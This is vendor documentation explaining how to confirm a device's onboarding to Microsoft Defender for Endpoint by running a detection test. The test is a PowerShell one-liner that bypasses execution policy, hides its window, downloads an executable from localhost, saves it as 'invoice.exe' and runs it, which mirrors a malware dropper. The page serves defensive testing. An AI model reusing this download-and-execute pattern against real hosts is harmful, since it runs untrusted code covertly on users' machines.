When you add a device to the Microsoft Defender for Endpoint service for management, this is also called onboarding devices. Onboarding allows devices to report signals about their health status to the service.

Making sure, or verifying, that a device has been added to the service successfully is a critical step in the entire deployment process. It assures that all the devices expected are being managed. 

## Verify Microsoft Defender for Endpoint onboarding of a device using a PowerShell detection test

Run the following PowerShell script on a newly onboarded device to verify that it's properly reporting to the Defender for Endpoint service.

1. Open an elevated command-line prompt on the device and run the script:

   1. Go to **Start** and type **cmd**.

   1. Right-click **Command Prompt** and select **Run as administrator**.

      :::image type="content" source="images/run-as-admin.png" alt-text="The Start menu pointing to Run as administrator" lightbox="images/run-as-admin.png":::
    
2. At the prompt, copy and run the following command:

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

The Command Prompt window closes automatically. If successful, a new alert appears in the portal for the onboarded device in about 10 minutes.

> [!NOTE]
> You can also use the EICAR test string to perform this test. Create a text file, paste the EICAR line, and save the file as an executable file to your endpoint's local drive. You will receive a test endpoint notification and an alert in the Microsoft 365 Defender portal.
